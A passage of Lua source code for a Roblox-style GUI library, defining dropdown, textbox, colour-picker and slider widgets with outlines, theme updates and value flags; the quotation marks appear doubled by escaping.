						dropdown.ItemsFrame.CanvasSize = dropdown.ItemsFrame.CanvasSize + UDim2.fromOffset(0, Item.AbsoluteSize.Y)

						Item.MouseButton1Down:Connect(function()
							if dropdown.multichoice then
								if dropdown:isSelected(v) then
									for i2, v2 in pairs(dropdown.values) do
										if v2 == v then
											table.remove(dropdown.values, i2)
										end
									end
									dropdown:Set(dropdown.values)
								else
									table.insert(dropdown.values, v)
									dropdown:Set(dropdown.values)
								end

								return
							else
								dropdown.Nav.Rotation = 90
								dropdown.ItemsFrame.Visible = false
								dropdown.ItemsFrame.Active = false
								dropdown.OutlineItems.Visible = false
								dropdown.BlackOutlineItems.Visible = false
								dropdown.BlackOutline2Items.Visible = false
								dropdown.IgnoreBackButtons.Visible = false
								dropdown.IgnoreBackButtons.Active = false
							end

							dropdown:Set(v)

							return
						end)

						runservice.RenderStepped:Connect(function()
							if dropdown.multichoice and dropdown:isSelected(v) or dropdown.values[1] == v then
								Item.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
								Item.TextColor3 = window.theme.accentcolor
								Item.Text = "" "" .. v
							else
								Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
								Item.TextColor3 = Color3.fromRGB(255, 255, 255)
								Item.Text = v
							end
						end)

						table.insert(dropdown.items, v)
						dropdown.ItemsFrame.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset, math.clamp(#dropdown.items * Item.AbsoluteSize.Y, 20, 156) + 4)
						dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.ItemsFrame.AbsoluteSize.X, (#dropdown.items * Item.AbsoluteSize.Y) + 4)

						dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
						dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(2, 2)
						dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
						dropdown.IgnoreBackButtons.Size = dropdown.ItemsFrame.Size
					end

					function dropdown:Remove(value)
						local item = dropdown.ItemsFrame:FindFirstChild(value)
						if item then
							for i, v in pairs(dropdown.items) do
								if v == value then
									table.remove(dropdown.items, i)
								end
							end

							dropdown.ItemsFrame.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset, math.clamp(#dropdown.items * item.AbsoluteSize.Y, 20, 156) + 4)
							dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.ItemsFrame.AbsoluteSize.X, (#dropdown.items * item.AbsoluteSize.Y) + 4)

							dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(2, 2)
							dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
							dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
							dropdown.IgnoreBackButtons.Size = dropdown.ItemsFrame.Size

							item:Remove()
						end
					end

					for i, v in pairs(dropdown.defaultitems) do
						dropdown:Add(v)
					end

					if dropdown.default then
						dropdown:Set(dropdown.default)
					end

					local MouseButton1Down = function()
						if dropdown.Nav.Rotation == 90 then
							tweenservice:Create(dropdown.Nav, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Rotation = - 90}):Play()
							if dropdown.items and #dropdown.items ~= 0 then
								dropdown.ItemsFrame.ScrollingEnabled = true
								sector.Main.Parent.ScrollingEnabled = false
								dropdown.ItemsFrame.Visible = true
								dropdown.ItemsFrame.Active = true
								dropdown.IgnoreBackButtons.Visible = true
								dropdown.IgnoreBackButtons.Active = true
								dropdown.OutlineItems.Visible = true
								dropdown.BlackOutlineItems.Visible = true
								dropdown.BlackOutline2Items.Visible = true
							end
						else
							tweenservice:Create(dropdown.Nav, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Rotation = 90}):Play()
							dropdown.ItemsFrame.ScrollingEnabled = false
							sector.Main.Parent.ScrollingEnabled = true
							dropdown.ItemsFrame.Visible = false
							dropdown.ItemsFrame.Active = false
							dropdown.IgnoreBackButtons.Visible = false
							dropdown.IgnoreBackButtons.Active = false
							dropdown.OutlineItems.Visible = false
							dropdown.BlackOutlineItems.Visible = false
							dropdown.BlackOutline2Items.Visible = false
						end
					end

					dropdown.Main.MouseButton1Down:Connect(MouseButton1Down)
					dropdown.Nav.MouseButton1Down:Connect(MouseButton1Down)

					dropdown.BlackOutline2.MouseEnter:Connect(function()
						dropdown.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
					end)
					dropdown.BlackOutline2.MouseLeave:Connect(function()
						dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end)

					sector:FixSize()
					table.insert(library.items, dropdown)

					return dropdown
				end

				function toggle:AddTextbox(default, callback, flag)
					local textbox = {}
					textbox.callback = callback or function() end
					textbox.default = default
					textbox.value = """"
					textbox.flag = flag or ((toggle.text or """") .. #sector.Items:GetChildren() .. ""a"")

					textbox.Holder = Instance.new(""Frame"", sector.Items)
					textbox.Holder.Name = ""holder""
					textbox.Holder.ZIndex = 5
					textbox.Holder.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 14)
					textbox.Holder.BorderSizePixel = 0
					textbox.Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

					textbox.Gradient = Instance.new(""UIGradient"", textbox.Holder)
					textbox.Gradient.Rotation = 90
					textbox.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))})

					textbox.Main = Instance.new(""TextBox"", textbox.Holder)
					textbox.Main.PlaceholderText = """"
					textbox.Main.Text = """"
					textbox.Main.BackgroundTransparency = 1
					textbox.Main.Font = window.theme.font
					textbox.Main.Name = ""textbox""
					textbox.Main.MultiLine = false
					textbox.Main.ClearTextOnFocus = false
					textbox.Main.ZIndex = 5
					textbox.Main.TextScaled = true
					textbox.Main.Size = textbox.Holder.Size
					textbox.Main.TextSize = 15
					textbox.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
					textbox.Main.BorderSizePixel = 0
					textbox.Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					textbox.Main.TextXAlignment = Enum.TextXAlignment.Left

					if textbox.flag and textbox.flag ~= """" then
						library.flags[textbox.flag] = textbox.default or """"
					end

					function textbox:Set(text)
						textbox.value = text
						textbox.Main.Text = text
						if textbox.flag and textbox.flag ~= """" then
							library.flags[textbox.flag] = text
						end
						pcall(textbox.callback, text)
					end
					updateevent.Event:Connect(function(theme)
						textbox.Main.Font = theme.font
					end)

					function textbox:Get()
						return textbox.value
					end

					if textbox.default then
						textbox:Set(textbox.default)
					end

					textbox.Main.FocusLost:Connect(function()
						textbox:Set(textbox.Main.Text)
					end)

					textbox.BlackOutline2 = Instance.new(""Frame"", textbox.Main)
					textbox.BlackOutline2.Name = ""blackline""
					textbox.BlackOutline2.ZIndex = 4
					textbox.BlackOutline2.Size = textbox.Main.Size + UDim2.fromOffset(6, 6)
					textbox.BlackOutline2.BorderSizePixel = 0
					textbox.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					textbox.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						textbox.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					textbox.Outline = Instance.new(""Frame"", textbox.Main)
					textbox.Outline.Name = ""blackline""
					textbox.Outline.ZIndex = 4
					textbox.Outline.Size = textbox.Main.Size + UDim2.fromOffset(4, 4)
					textbox.Outline.BorderSizePixel = 0
					textbox.Outline.BackgroundColor3 = window.theme.outlinecolor
					textbox.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						textbox.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					textbox.BlackOutline = Instance.new(""Frame"", textbox.Main)
					textbox.BlackOutline.Name = ""blackline""
					textbox.BlackOutline.ZIndex = 4
					textbox.BlackOutline.Size = textbox.Main.Size + UDim2.fromOffset(2, 2)
					textbox.BlackOutline.BorderSizePixel = 0
					textbox.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					textbox.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						textbox.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					textbox.BlackOutline2.MouseEnter:Connect(function()
						textbox.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
					end)
					textbox.BlackOutline2.MouseLeave:Connect(function()
						textbox.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end)

					sector:FixSize()
					table.insert(library.items, textbox)

					return textbox
				end

				function toggle:AddColorpicker(default, callback, flag)
					local colorpicker = {}

					colorpicker.callback = callback or function() end
					colorpicker.default = default or Color3.fromRGB(255, 255, 255)
					colorpicker.value = colorpicker.default
					colorpicker.flag = flag or ((toggle.text or """") .. #toggle.Items:GetChildren())

					colorpicker.Main = Instance.new(""Frame"", toggle.Items)
					colorpicker.Main.ZIndex = 6
					colorpicker.Main.BorderSizePixel = 0
					colorpicker.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					colorpicker.Main.Size = UDim2.fromOffset(16, 10)

					colorpicker.Gradient = Instance.new(""UIGradient"", colorpicker.Main)
					colorpicker.Gradient.Rotation = 90

					local clr = Color3.new(math.clamp(colorpicker.value.R / 1.7, 0, 1), math.clamp(colorpicker.value.G / 1.7, 0, 1), math.clamp(colorpicker.value.B / 1.7, 0, 1))
					colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, colorpicker.value), ColorSequenceKeypoint.new(1, clr)})

					colorpicker.BlackOutline2 = Instance.new(""Frame"", colorpicker.Main)
					colorpicker.BlackOutline2.Name = ""blackline""
					colorpicker.BlackOutline2.ZIndex = 4
					colorpicker.BlackOutline2.Size = colorpicker.Main.Size + UDim2.fromOffset(6, 6)
					colorpicker.BlackOutline2.BorderSizePixel = 0
					colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					colorpicker.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						if window.OpenedColorPickers[colorpicker.MainPicker] then
							colorpicker.BlackOutline2.BackgroundColor3 = theme.accentcolor
						else
							colorpicker.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
						end
					end)

					colorpicker.Outline = Instance.new(""Frame"", colorpicker.Main)
					colorpicker.Outline.Name = ""blackline""
					colorpicker.Outline.ZIndex = 4
					colorpicker.Outline.Size = colorpicker.Main.Size + UDim2.fromOffset(4, 4)
					colorpicker.Outline.BorderSizePixel = 0
					colorpicker.Outline.BackgroundColor3 = window.theme.outlinecolor
					colorpicker.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						colorpicker.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					colorpicker.BlackOutline = Instance.new(""Frame"", colorpicker.Main)
					colorpicker.BlackOutline.Name = ""blackline""
					colorpicker.BlackOutline.ZIndex = 4
					colorpicker.BlackOutline.Size = colorpicker.Main.Size + UDim2.fromOffset(2, 2)
					colorpicker.BlackOutline.BorderSizePixel = 0
					colorpicker.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					colorpicker.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						colorpicker.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					colorpicker.BlackOutline2.MouseEnter:Connect(function()
						colorpicker.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
					end)

					colorpicker.BlackOutline2.MouseLeave:Connect(function()
						if not window.OpenedColorPickers[colorpicker.MainPicker] then
							colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
						end
					end)

					colorpicker.MainPicker = Instance.new(""TextButton"", colorpicker.Main)
					colorpicker.MainPicker.Name = ""picker""
					colorpicker.MainPicker.ZIndex = 100
					colorpicker.MainPicker.Visible = false
					colorpicker.MainPicker.AutoButtonColor = false
					colorpicker.MainPicker.Text = """"
					window.OpenedColorPickers[colorpicker.MainPicker] = false
					colorpicker.MainPicker.Size = UDim2.fromOffset(180, 196)
					colorpicker.MainPicker.BorderSizePixel = 0
					colorpicker.MainPicker.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					colorpicker.MainPicker.Rotation = 0
					colorpicker.MainPicker.Position = UDim2.fromOffset(- colorpicker.MainPicker.AbsoluteSize.X + colorpicker.Main.AbsoluteSize.X, 17)

					colorpicker.BlackOutline3 = Instance.new(""Frame"", colorpicker.MainPicker)
					colorpicker.BlackOutline3.Name = ""blackline""
					colorpicker.BlackOutline3.ZIndex = 98
					colorpicker.BlackOutline3.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(6, 6)
					colorpicker.BlackOutline3.BorderSizePixel = 0
					colorpicker.BlackOutline3.BackgroundColor3 = window.theme.outlinecolor2
					colorpicker.BlackOutline3.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						colorpicker.BlackOutline3.BackgroundColor3 = theme.outlinecolor2
					end)

					colorpicker.Outline2 = Instance.new(""Frame"", colorpicker.MainPicker)
					colorpicker.Outline2.Name = ""blackline""
					colorpicker.Outline2.ZIndex = 98
					colorpicker.Outline2.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(4, 4)
					colorpicker.Outline2.BorderSizePixel = 0
					colorpicker.Outline2.BackgroundColor3 = window.theme.outlinecolor
					colorpicker.Outline2.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						colorpicker.Outline2.BackgroundColor3 = theme.outlinecolor
					end)

					colorpicker.BlackOutline3 = Instance.new(""Frame"", colorpicker.MainPicker)
					colorpicker.BlackOutline3.Name = ""blackline""
					colorpicker.BlackOutline3.ZIndex = 98
					colorpicker.BlackOutline3.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(2, 2)
					colorpicker.BlackOutline3.BorderSizePixel = 0
					colorpicker.BlackOutline3.BackgroundColor3 = window.theme.outlinecolor2
					colorpicker.BlackOutline3.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						colorpicker.BlackOutline3.BackgroundColor3 = theme.outlinecolor2
					end)

					colorpicker.hue = Instance.new(""ImageLabel"", colorpicker.MainPicker)
					colorpicker.hue.ZIndex = 101
					colorpicker.hue.Position = UDim2.new(0, 3, 0, 3)
					colorpicker.hue.Size = UDim2.new(0, 172, 0, 172)
					colorpicker.hue.Image = ""rbxassetid://4155801252""
					colorpicker.hue.ScaleType = Enum.ScaleType.Stretch
					colorpicker.hue.BackgroundColor3 = Color3.new(1, 0, 0)
					colorpicker.hue.BorderColor3 = window.theme.outlinecolor2
					updateevent.Event:Connect(function(theme)
						colorpicker.hue.BorderColor3 = theme.outlinecolor2
					end)

					colorpicker.hueselectorpointer = Instance.new(""ImageLabel"", colorpicker.MainPicker)
					colorpicker.hueselectorpointer.ZIndex = 101
					colorpicker.hueselectorpointer.BackgroundTransparency = 1
					colorpicker.hueselectorpointer.BorderSizePixel = 0
					colorpicker.hueselectorpointer.Position = UDim2.new(0, 0, 0, 0)
					colorpicker.hueselectorpointer.Size = UDim2.new(0, 7, 0, 7)
					colorpicker.hueselectorpointer.Image = ""rbxassetid://6885856475""

					colorpicker.selector = Instance.new(""TextLabel"", colorpicker.MainPicker)
					colorpicker.selector.ZIndex = 100
					colorpicker.selector.Position = UDim2.new(0, 3, 0, 181)
					colorpicker.selector.Size = UDim2.new(0, 173, 0, 10)
					colorpicker.selector.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					colorpicker.selector.BorderColor3 = window.theme.outlinecolor2
					colorpicker.selector.Text = """"
					updateevent.Event:Connect(function(theme)
						colorpicker.selector.BorderColor3 = theme.outlinecolor2
					end)

					colorpicker.gradient = Instance.new(""UIGradient"", colorpicker.selector)
					colorpicker.gradient.Color = ColorSequence.new({
						ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)), 
						ColorSequenceKeypoint.new(0.17, Color3.new(1, 0, 1)), 
						ColorSequenceKeypoint.new(0.33, Color3.new(0, 0, 1)), 
						ColorSequenceKeypoint.new(0.5, Color3.new(0, 1, 1)), 
						ColorSequenceKeypoint.new(0.67, Color3.new(0, 1, 0)), 
						ColorSequenceKeypoint.new(0.83, Color3.new(1, 1, 0)), 
						ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0))
					})

					colorpicker.pointer = Instance.new(""Frame"", colorpicker.selector)
					colorpicker.pointer.ZIndex = 101
					colorpicker.pointer.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					colorpicker.pointer.Position = UDim2.new(0, 0, 0, 0)
					colorpicker.pointer.Size = UDim2.new(0, 2, 0, 10)
					colorpicker.pointer.BorderColor3 = Color3.fromRGB(255, 255, 255)

					if colorpicker.flag and colorpicker.flag ~= """" then
						library.flags[colorpicker.flag] = colorpicker.default
					end

					function colorpicker:RefreshHue()
						local x = (mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X
						local y = (mouse.Y - colorpicker.hue.AbsolutePosition.Y) / colorpicker.hue.AbsoluteSize.Y
						colorpicker.hueselectorpointer:TweenPosition(UDim2.new(math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 0.952 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 0, math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 0.885 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
						colorpicker:Set(Color3.fromHSV(colorpicker.color, math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 1 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 1 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y)))
					end

					function colorpicker:RefreshSelector()
						local pos = math.clamp((mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X, 0, 1)
						colorpicker.color = 1 - pos
						colorpicker.pointer:TweenPosition(UDim2.new(pos, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
						colorpicker.hue.BackgroundColor3 = Color3.fromHSV(1 - pos, 1, 1)

						local x = (colorpicker.hueselectorpointer.AbsolutePosition.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X
						local y = (colorpicker.hueselectorpointer.AbsolutePosition.Y - colorpicker.hue.AbsolutePosition.Y) / colorpicker.hue.AbsoluteSize.Y
						colorpicker:Set(Color3.fromHSV(colorpicker.color, math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 1 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 1 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y)))
					end

					function colorpicker:Set(value)
						local color = Color3.new(math.clamp(value.r, 0, 1), math.clamp(value.g, 0, 1), math.clamp(value.b, 0, 1))
						colorpicker.value = color
						if colorpicker.flag and colorpicker.flag ~= """" then
							library.flags[colorpicker.flag] = color
						end
						local clr = Color3.new(math.clamp(color.R / 1.7, 0, 1), math.clamp(color.G / 1.7, 0, 1), math.clamp(color.B / 1.7, 0, 1))
						colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, color), ColorSequenceKeypoint.new(1, clr)})
						pcall(colorpicker.callback, color)
					end

					function colorpicker:Get(value)
						return colorpicker.value
					end

					colorpicker:Set(colorpicker.default)

					local dragging_selector = false
					local dragging_hue = false

					colorpicker.selector.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_selector = true
							colorpicker:RefreshSelector()
						end
					end)

					colorpicker.selector.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_selector = false
							colorpicker:RefreshSelector()
						end
					end)

					colorpicker.hue.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_hue = true
							colorpicker:RefreshHue()
						end
					end)

					colorpicker.hue.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_hue = false
							colorpicker:RefreshHue()
						end
					end)

					uis.InputChanged:Connect(function(input)
						if dragging_selector and input.UserInputType == Enum.UserInputType.MouseMovement then
							colorpicker:RefreshSelector()
						end
						if dragging_hue and input.UserInputType == Enum.UserInputType.MouseMovement then
							colorpicker:RefreshHue()
						end
					end)

					local inputBegan = function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							for i, v in pairs(window.OpenedColorPickers) do
								if v and i ~= colorpicker.MainPicker then
									i.Visible = false
									window.OpenedColorPickers[i] = false
								end
							end

							colorpicker.MainPicker.Visible = not colorpicker.MainPicker.Visible
							window.OpenedColorPickers[colorpicker.MainPicker] = colorpicker.MainPicker.Visible
							if window.OpenedColorPickers[colorpicker.MainPicker] then
								colorpicker.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
							else
								colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
							end
						end
					end

					colorpicker.Main.InputBegan:Connect(inputBegan)
					colorpicker.Outline.InputBegan:Connect(inputBegan)
					colorpicker.BlackOutline2.InputBegan:Connect(inputBegan)
					table.insert(library.items, colorpicker)

					return colorpicker
				end

				function toggle:AddSlider(min, default, max, decimals, callback, flag)
					local slider = {}
					slider.text = text or """"
					slider.callback = callback or function(value) end
					slider.min = min or 0
					slider.max = max or 100
					slider.decimals = decimals or 1
					slider.default = default or slider.min
					slider.flag = flag or ((toggle.text or """") .. #toggle.Items:GetChildren())

					slider.value = slider.default
					local dragging = false

					slider.Main = Instance.new(""TextButton"", sector.Items)
					slider.Main.Name = ""slider""
					slider.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					slider.Main.Position = UDim2.fromOffset(0, 0)
					slider.Main.BorderSizePixel = 0
					slider.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 12)
					slider.Main.AutoButtonColor = false
					slider.Main.Text = """"
					slider.Main.ZIndex = 7

					slider.InputLabel = Instance.new(""TextLabel"", slider.Main)
					slider.InputLabel.BackgroundTransparency = 1
					slider.InputLabel.Size = slider.Main.Size
					slider.InputLabel.Font = window.theme.font
					slider.InputLabel.Text = ""0""
					slider.InputLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
					slider.InputLabel.Position = slider.Main.Position
					slider.InputLabel.Selectable = false
					slider.InputLabel.TextSize = 15
					slider.InputLabel.ZIndex = 9
					slider.InputLabel.TextStrokeTransparency = 1
					slider.InputLabel.TextXAlignment = Enum.TextXAlignment.Center
					updateevent.Event:Connect(function(theme)
						slider.InputLabel.Font = theme.font
						slider.InputLabel.TextColor3 = theme.itemscolor
					end)

					slider.BlackOutline2 = Instance.new(""Frame"", slider.Main)
					slider.BlackOutline2.Name = ""blackline""
					slider.BlackOutline2.ZIndex = 4
					slider.BlackOutline2.Size = slider.Main.Size + UDim2.fromOffset(6, 6)
					slider.BlackOutline2.BorderSizePixel = 0
					slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					slider.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						slider.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					slider.Outline = Instance.new(""Frame"", slider.Main)
					slider.Outline.Name = ""blackline""
					slider.Outline.ZIndex = 4
					slider.Outline.Size = slider.Main.Size + UDim2.fromOffset(4, 4)
					slider.Outline.BorderSizePixel = 0
					slider.Outline.BackgroundColor3 = window.theme.outlinecolor
					slider.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						slider.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					slider.BlackOutline = Instance.new(""Frame"", slider.Main)
					slider.BlackOutline.Name = ""blackline""
					slider.BlackOutline.ZIndex = 4
					slider.BlackOutline.Size = slider.Main.Size + UDim2.fromOffset(2, 2)
					slider.BlackOutline.BorderSizePixel = 0
					slider.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					slider.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						slider.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					slider.Gradient = Instance.new(""UIGradient"", slider.Main)
					slider.Gradient.Rotation = 90
					slider.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(41, 41, 41))})

					slider.SlideBar = Instance.new(""Frame"", slider.Main)
					slider.SlideBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					slider.SlideBar.ZIndex = 8
					slider.SlideBar.BorderSizePixel = 0
					slider.SlideBar.Size = UDim2.fromOffset(0, slider.Main.Size.Y.Offset)

					slider.Gradient2 = Instance.new(""UIGradient"", slider.SlideBar)
					slider.Gradient2.Rotation = 90
					slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.accentcolor), ColorSequenceKeypoint.new(1, window.theme.accentcolor2)})
					updateevent.Event:Connect(function(theme)
						slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.accentcolor), ColorSequenceKeypoint.new(1, theme.accentcolor2)})
					end)

					slider.BlackOutline2.MouseEnter:Connect(function()
						slider.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
					end)
					slider.BlackOutline2.MouseLeave:Connect(function()
						slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end)

					if slider.flag and slider.flag ~= """" then
						library.flags[slider.flag] = slider.default or slider.min or 0
					end

					function slider:Get()
						return slider.value
					end

					function slider:Set(value)
						slider.value = math.clamp(math.round(value * slider.decimals) / slider.decimals, slider.min, slider.max)
						local percent = 1 - ((slider.max - slider.value) / (slider.max - slider.min))
						if slider.flag and slider.flag ~= """" then
							library.flags[slider.flag] = slider.value
						end
						slider.SlideBar:TweenSize(UDim2.fromOffset(percent * slider.Main.AbsoluteSize.X, slider.Main.AbsoluteSize.Y), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
						slider.InputLabel.Text = slider.value
						pcall(slider.callback, slider.value)
					end
					slider:Set(slider.default)

					function slider:Refresh()
						local mousepos = game:GetService(""Workspace"").CurrentCamera:WorldToViewportPoint(mouse.Hit.p)
						local percent = math.clamp(mousepos.X - slider.SlideBar.AbsolutePosition.X, 0, slider.Main.AbsoluteSize.X) / slider.Main.AbsoluteSize.X
						local value = math.round((slider.min + (slider.max - slider.min) * percent) * slider.decimals) / slider.decimals
						value = math.clamp(value, slider.min, slider.max)
						slider:Set(value)
					end

					slider.SlideBar.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = true
							slider:Refresh()
						end
					end)

					slider.SlideBar.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = false
						end
					end)

					slider.Main.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = true
							slider:Refresh()
						end
					end)

					slider.Main.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = false
						end
					end)

					uis.InputChanged:Connect(function(input)
						if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
							slider:Refresh()
						end
					end)

					sector:FixSize()
					table.insert(library.items, slider)

					return slider
				end

				toggle.Main.MouseButton1Down:Connect(function()
					toggle:Set(not toggle.CheckedFrame.Visible)
				end)

				toggle.Label.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						toggle:Set(not toggle.CheckedFrame.Visible)
					end
				end)

				local MouseEnter = function()
					toggle.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end

				local MouseLeave = function()
					toggle.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end

				toggle.Label.MouseEnter:Connect(MouseEnter)
				toggle.Label.MouseLeave:Connect(MouseLeave)
				toggle.BlackOutline2.MouseEnter:Connect(MouseEnter)
				toggle.BlackOutline2.MouseLeave:Connect(MouseLeave)

				sector:FixSize()
				table.insert(library.items, toggle)

				return toggle
			end

			function sector:AddTextbox(text, default, callback, flag)
				local textbox = {}
				textbox.text = text or """"
				textbox.callback = callback or function() end
				textbox.default = default
				textbox.value = """"
				textbox.flag = flag or text or """"

				textbox.Label = Instance.new(""TextButton"", sector.Items)
				textbox.Label.Name = ""Label""
				textbox.Label.AutoButtonColor = false
				textbox.Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				textbox.Label.BackgroundTransparency = 1
				textbox.Label.Position = UDim2.fromOffset(sector.Main.Size.X.Offset, 0)
				textbox.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 0)
				textbox.Label.Font = window.theme.font
				textbox.Label.ZIndex = 5
				textbox.Label.Text = textbox.text
				textbox.Label.TextColor3 = window.theme.itemscolor
				textbox.Label.TextSize = 15
				textbox.Label.TextStrokeTransparency = 1
				textbox.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					textbox.Label.Font = theme.font
				end)

				textbox.Holder = Instance.new(""Frame"", sector.Items)
				textbox.Holder.Name = ""holder""
				textbox.Holder.ZIndex = 5
